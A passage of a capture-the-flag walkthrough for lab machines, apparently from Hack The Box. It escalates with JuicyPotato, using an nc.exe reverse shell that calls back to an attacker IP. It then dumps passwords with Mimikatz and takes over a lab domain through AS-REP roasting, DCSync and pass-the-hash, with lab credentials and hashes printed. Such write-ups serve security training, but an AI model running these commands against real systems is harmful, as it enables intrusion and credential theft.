  **rename JuicyPotato.exe js.exe**
  -----------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image115.png"
        data-srcset="/startingpoint/media/image115.png, media/image115.png 1.5x, /startingpoint/media/image115.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image115.png"
        title="/startingpoint/media/image115.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>From our shell, we can create a batch file that will be executed by the
exploit, and return a SYSTEM shell. Let&rsquo;s add the following contents to
<em><strong>shell.bat</strong></em>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ------------------------------------------------------------------------------------------------------------------------------
  **echo START C:<span class="se">\\</span>inetpub<span class="se">\\</span>wwwroot<span class="se">\\</span>wordpress<span class="se">\\</span>wp-content<span class="se">\\</span>uploads<span class="se">\\</span>nc.exe -e powershell.exe 10.10.14.2 <span class="m">1111</span> &gt; shell.bat**
  ------------------------------------------------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image116.png"
        data-srcset="/startingpoint/media/image116.png, media/image116.png 1.5x, /startingpoint/media/image116.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image116.png"
        title="/startingpoint/media/image116.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image117.png"
        data-srcset="/startingpoint/media/image117.png, media/image117.png 1.5x, /startingpoint/media/image117.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image117.png"
        title="/startingpoint/media/image117.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image118.png"
        data-srcset="/startingpoint/media/image118.png, media/image118.png 1.5x, /startingpoint/media/image118.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image118.png"
        title="/startingpoint/media/image118.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Let&rsquo;s start, from another terminal, another netcat listener:</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image119.png"
        data-srcset="/startingpoint/media/image119.png, media/image119.png 1.5x, /startingpoint/media/image119.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image119.png"
        title="/startingpoint/media/image119.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Next, we execute the netcat shell using the JuicyPotato binary(js.exe):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ---------------------------------------------------------------------------------------------
  **js.exe -t <span class="se">\*</span> -p C:<span class="se">\\</span>inetpub<span class="se">\\</span>wwwroot<span class="se">\\</span>wordpress<span class="se">\\</span>wp-content<span class="se">\\</span>uploads<span class="se">\\</span>shell.bat -l 1337**
  ---------------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image120.png"
        data-srcset="/startingpoint/media/image120.png, media/image120.png 1.5x, /startingpoint/media/image120.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image120.png"
        title="/startingpoint/media/image120.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p><em><strong>NOTE:</strong></em> if our payload is not working, we can use another CLSID</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ---------------------------------------------------------------
  Option to add : **-c <span class="o">{</span>bb6df56b-cace-11dc-9992-0019b93a3a84<span class="o">}</span>**
  ---------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>Now on the listener terminal we have a shell as “<strong>nt
authority\system</strong>”</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image121.png"
        data-srcset="/startingpoint/media/image121.png, media/image121.png 1.5x, /startingpoint/media/image121.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image121.png"
        title="/startingpoint/media/image121.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>And we can have access to the <strong>“root.txt”</strong> file</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image122.png"
        data-srcset="/startingpoint/media/image122.png, media/image122.png 1.5x, /startingpoint/media/image122.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image122.png"
        title="/startingpoint/media/image122.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<h3 id="9702-post-exploitation">◦ Post Exploitation</h3>
<p>===================</p>
<p>We can now try to dump cache password. using a tool named “<strong>Mimikatz”</strong></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image123.png"
        data-srcset="/startingpoint/media/image123.png, media/image123.png 1.5x, /startingpoint/media/image123.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image123.png"
        title="/startingpoint/media/image123.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>The 64 bit versione is the one we need</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image124.png"
        data-srcset="/startingpoint/media/image124.png, media/image124.png 1.5x, /startingpoint/media/image124.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image124.png"
        title="/startingpoint/media/image124.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We use the meterpeter session to upload the “mimikatz.exe” file:</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image125.png"
        data-srcset="/startingpoint/media/image125.png, media/image125.png 1.5x, /startingpoint/media/image125.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image125.png"
        title="/startingpoint/media/image125.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>As a “<strong>nt authority\system</strong>” we execute mimikatz and use the
<strong>sekurlsa</strong> command to extract logon passwords</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  --------------------
  **./mimikatz.exe**
  --------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image126.png"
        data-srcset="/startingpoint/media/image126.png, media/image126.png 1.5x, /startingpoint/media/image126.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image126.png"
        title="/startingpoint/media/image126.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ------------------------------
  **sekurlsa::logonpasswords**
  ------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image126.png"
        data-srcset="/startingpoint/media/image126.png, media/image126.png 1.5x, /startingpoint/media/image126.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image126.png"
        title="/startingpoint/media/image126.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>And we find the password “<strong>Password1234!”</strong> for domain user
“<strong>Sandra”</strong>.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image127.png"
        data-srcset="/startingpoint/media/image127.png, media/image127.png 1.5x, /startingpoint/media/image127.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image127.png"
        title="/startingpoint/media/image127.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<h2 id="9656-pathfinder">▸ PATHFINDER</h2>
<ul>
<li>Machine : <b>Pathfinder</b> </li>
<li>Ip: <b>10.10.10.29</b></li>
</ul>
<h3 id="9702-enumeration-2">◦ Enumeration</h3>
<p>=============</p>
<p>We are going to use “masscan” this time</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">  --------------------------------------------------------
  **masscan -p 1-65535 10.10.10.30 -e tun0 --rate=1000**
  --------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image128.png"
        data-srcset="/startingpoint/media/image128.png, media/image128.png 1.5x, /startingpoint/media/image128.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image128.png"
        title="/startingpoint/media/image128.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Port <strong>88</strong> is typically associated with Kerberos</p>
<p>Port <strong>389</strong> with LDAP, which indicates that this is a Domain
Controller.</p>
<p>We note that WinRM is enabled on port <strong>5985</strong>.</p>
<p>We can attempt to enumerate Active Directory using the credentials we
obtained in a previous machine:</p>
<ul>
<li>
<p><strong>sandra</strong></p>
</li>
<li>
<p><strong>Password1234!</strong></p>
</li>
</ul>
<p>We can achieve this using a python bloodhound injester, but first, we
need to install <strong>neo4j</strong> and <strong>BloodHound</strong>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ----------------------------
  **apt install neo4j**
  
  **apt install bloodhound**
  ----------------------------
</code></pre></td></tr></table>
</div>
</div><p>Let’s install now the python bloodhound injester, tnat can be found at
<em>here</em>:</p>
<ul>
<li><em><a href="https://github.com/fox-it/BloodHound.py" target="_blank" rel="noopener noreffer">https://github.com/fox-it/BloodHound.py</a></em></li>
</ul>
<p>It can also be installed using pip:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ----------------------------
  **pip install bloodhound**
  ----------------------------
</code></pre></td></tr></table>
</div>
</div><p>Let’s run the command</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ---------------------------------------------------------------------------------------------------------------------------
  **bloodhound-python -d megacorp.local -u sandra -p <span class="s2">&#34;Password1234!&#34;</span> -gc pathfinder.megacorp.local -c all -ns 10.10.10.30**
  ---------------------------------------------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image129.png"
        data-srcset="/startingpoint/media/image129.png, media/image129.png 1.5x, /startingpoint/media/image129.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image129.png"
        title="/startingpoint/media/image129.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>The BloodHound injester created some json files ready to be imported
into BloodHound.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image130.png"
        data-srcset="/startingpoint/media/image130.png, media/image130.png 1.5x, /startingpoint/media/image130.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image130.png"
        title="/startingpoint/media/image130.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Next, we need to configure the neo4j service. We can accomplish this by
running the following command</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -------------------
  **neo4j console**
  -------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image131.png"
        data-srcset="/startingpoint/media/image131.png, media/image131.png 1.5x, /startingpoint/media/image131.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image131.png"
        title="/startingpoint/media/image131.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>You will be then prompted to insert or change(at first login) your
password.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image132.png"
        data-srcset="/startingpoint/media/image132.png, media/image132.png 1.5x, /startingpoint/media/image132.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image132.png"
        title="/startingpoint/media/image132.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>If connected we will see</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image133.png"
        data-srcset="/startingpoint/media/image133.png, media/image133.png 1.5x, /startingpoint/media/image133.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image133.png"
        title="/startingpoint/media/image133.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Next, we start BloodHound</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -----------------------------
  **bloodhound --no-sandbox**
  -----------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image134.png"
        data-srcset="/startingpoint/media/image134.png, media/image134.png 1.5x, /startingpoint/media/image134.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image134.png"
        title="/startingpoint/media/image134.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Ensure you have a connection to the database; indicated by a ✔️ symbol
at the top of the three input fields. The default username is neo4j with
the password previously set.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image135.png"
        data-srcset="/startingpoint/media/image135.png, media/image135.png 1.5x, /startingpoint/media/image135.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image135.png"
        title="/startingpoint/media/image135.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image136.png"
        data-srcset="/startingpoint/media/image136.png, media/image136.png 1.5x, /startingpoint/media/image136.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image136.png"
        title="/startingpoint/media/image136.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/>
Below before importing the .json files:</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image137.png"
        data-srcset="/startingpoint/media/image137.png, media/image137.png 1.5x, /startingpoint/media/image137.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image137.png"
        title="/startingpoint/media/image137.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Opening BloodHound, we can drag and drop the .json files, and BloodHound
will begin to analyze the data.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image138.png"
        data-srcset="/startingpoint/media/image138.png, media/image138.png 1.5x, /startingpoint/media/image138.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image138.png"
        title="/startingpoint/media/image138.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We can select various queries, of which some very useful ones are
<strong>Shortest Paths to High value Targets</strong> and <strong>Find Principles with
DCSync Rights</strong>.</p>
<p>While the latter query returns this:</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image139.png"
        data-srcset="/startingpoint/media/image139.png, media/image139.png 1.5x, /startingpoint/media/image139.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image139.png"
        title="/startingpoint/media/image139.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Let’s select the domain “MEGACORP.LOCAL”</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image140.png"
        data-srcset="/startingpoint/media/image140.png, media/image140.png 1.5x, /startingpoint/media/image140.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image140.png"
        title="/startingpoint/media/image140.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>The query will generate the below graph for domain “MEGACORP.LOCAL”</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image141.png"
        data-srcset="/startingpoint/media/image141.png, media/image141.png 1.5x, /startingpoint/media/image141.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image141.png"
        title="/startingpoint/media/image141.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We can see that the <strong>svc_bes</strong> has <strong>GetChangesAll</strong> privileges to the
domain. This means that the account has the ability to request
replication data from the domain controller, and gain sensitive
information such as user hashes.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image142.png"
        data-srcset="/startingpoint/media/image142.png, media/image142.png 1.5x, /startingpoint/media/image142.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image142.png"
        title="/startingpoint/media/image142.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<h3 id="9702-lateral-movement-1">◦ Lateral Movement</h3>
<p>=====================</p>
<p>It&rsquo;s worth checking if Kerberos pre-authentication has been disabled for
this account, which means it is vulnerable to <em>ASREPRoasting</em>. We can
check this using a tool such as Impacket&rsquo;s GetNPUsers.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">  --------------------------------------------------------------------------------
  **GetNPUsers.py megacorp.local/svc\_bes -request -no-pass -dc-ip 10.10.10.30**
  --------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image143.png"
        data-srcset="/startingpoint/media/image143.png, media/image143.png 1.5x, /startingpoint/media/image143.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image143.png"
        title="/startingpoint/media/image143.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image144.png"
        data-srcset="/startingpoint/media/image144.png, media/image144.png 1.5x, /startingpoint/media/image144.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image144.png"
        title="/startingpoint/media/image144.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Below out TGT ticket</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  **<span class="se">\$</span>krb5asrep<span class="se">\$</span>23<span class="se">\$</span>svc<span class="se">\_</span>bes@MEGACORP.LOCAL:0969b177c87205436a4ef15e3227c3af<span class="se">\$</span>f967e09d463ebcfa60a01c5ddb3606de78b62d8629e8de55578236534abf7a8442f3b07dfe0b8fa622dceabb66586c99dec8a3e4629a099fb01acc5721e0ca5ebf59fa0f6841f456a7a855ded8fb2b5860066cca671c8ea362c335c5a1a0bde1a9091b629535fec165388e46b3069c002dd45569a89f6d30f9139911968364ae84bf06de3d39cdcbb3a44b373f71c3ff3f030f3896fa4f698693889e8677136e942d9ba1e3175dc70e67f1b998d52170f3347dcc766fda831f9cd5d1f7d94706f3b423a9bf75869a6772280f69d2f2855a3b855ee221f053478f7e54c98c7fde493f85ce3cec16e47f0c20ced4a65b14**
  ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>Once obtained the TGT ticket for the <strong>svc_bes,</strong> let’s save it into a
file called hash(it could be any name).</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image145.png"
        data-srcset="/startingpoint/media/image145.png, media/image145.png 1.5x, /startingpoint/media/image145.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image145.png"
        title="/startingpoint/media/image145.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We could have also used:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -----------------------------------------------------------------------------------------------------
  **GetNPUsers.py megacorp.local/svc<span class="se">\_</span>bes -request -no-pass -dc-ip 10.10.10.30 <span class="p">|</span> grep krb &gt; hash**
  -----------------------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image146.png"
        data-srcset="/startingpoint/media/image146.png, media/image146.png 1.5x, /startingpoint/media/image146.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image146.png"
        title="/startingpoint/media/image146.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We will use JTR in conjunction with rockyou.txt to obtain the plaintext
password (but we could have also used Hashcat)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ----------------------------------------------------------
  **john <span class="nb">hash</span> -wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt**
  ----------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image147.png"
        data-srcset="/startingpoint/media/image147.png, media/image147.png 1.5x, /startingpoint/media/image147.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image147.png"
        title="/startingpoint/media/image147.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Below the password for <strong>svc_bes : Sheffield19</strong></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image148.png"
        data-srcset="/startingpoint/media/image148.png, media/image148.png 1.5x, /startingpoint/media/image148.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image148.png"
        title="/startingpoint/media/image148.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>It is now possible to access the server as <strong>svc_bes</strong> using **WinRM **</p>
<p>(With the <strong>nmap scan</strong> we noted that WinRM was enabled on port
<strong>5985)</strong></p>
<br>
<p><strong>Let’s install “<em>evil-winrm</em>” (Installation directly as ruby gem)</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">  ----------------------------
  **gem install evil-winrm**
  ----------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image149.png"
        data-srcset="/startingpoint/media/image149.png, media/image149.png 1.5x, /startingpoint/media/image149.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image149.png"
        title="/startingpoint/media/image149.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>And run it against 10.10.10.30 using “svc_bes” credentials</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">  ----------------------------------------------------------
  **evil-winrm -i 10.10.10.30 -u svc\_bes -p Sheffield19**
  ----------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image150.png"
        data-srcset="/startingpoint/media/image150.png, media/image150.png 1.5x, /startingpoint/media/image150.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image150.png"
        title="/startingpoint/media/image150.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<h3 id="9702-privilege-escalation-2">◦ Privilege Escalation</h3>
<p>=========================</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image142.png"
        data-srcset="/startingpoint/media/image142.png, media/image142.png 1.5x, /startingpoint/media/image142.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image142.png"
        title="/startingpoint/media/image142.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>In order to leverage the <strong>GetChangesAll</strong> permission, we can use
Impacket&rsquo;s <em>secretsdump.py</em> to perform a <em>DCSync</em> attack and dump the
NTLM hashes of all domain users.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">  ---------------------------------------------------------------------------------------
  **secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc\_bes:Sheffield19@10.10.10.30**
  ---------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image151.png"
        data-srcset="/startingpoint/media/image151.png, media/image151.png 1.5x, /startingpoint/media/image151.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image151.png"
        title="/startingpoint/media/image151.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We can see the default domain Administrator NTLM hash</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image152.png"
        data-srcset="/startingpoint/media/image152.png, media/image152.png 1.5x, /startingpoint/media/image152.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image152.png"
        title="/startingpoint/media/image152.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We can use this in a <em>PTH attack</em> (Pass-the-Hash attack) to gain
elevated access to the system.</p>
<p>For this, we can use Impacket&rsquo;s <strong>psexec.py</strong> as follow:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">  ----------------------------------------------------------------------------------------------------
  **psexec.py megacorp.local/administrator@10.10.10.30 -hashes &lt;NTML hash&gt;:&lt;NTLM hash&gt;**
  ----------------------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>For &lt;<strong>NTML hash</strong>&gt;:&lt;<strong>NTLM hash</strong>&gt; we will use:</p>
<ul>
<li>
<p><strong>NTML hash &ndash;&gt; aad3b435b51404eeaad3b435b51404ee</strong></p>
</li>
<li>
<p><strong>NTLM hash &ndash;&gt; 8a4b77d52b1845bfe949ed1b9643bb18</strong></p>
</li>
</ul>
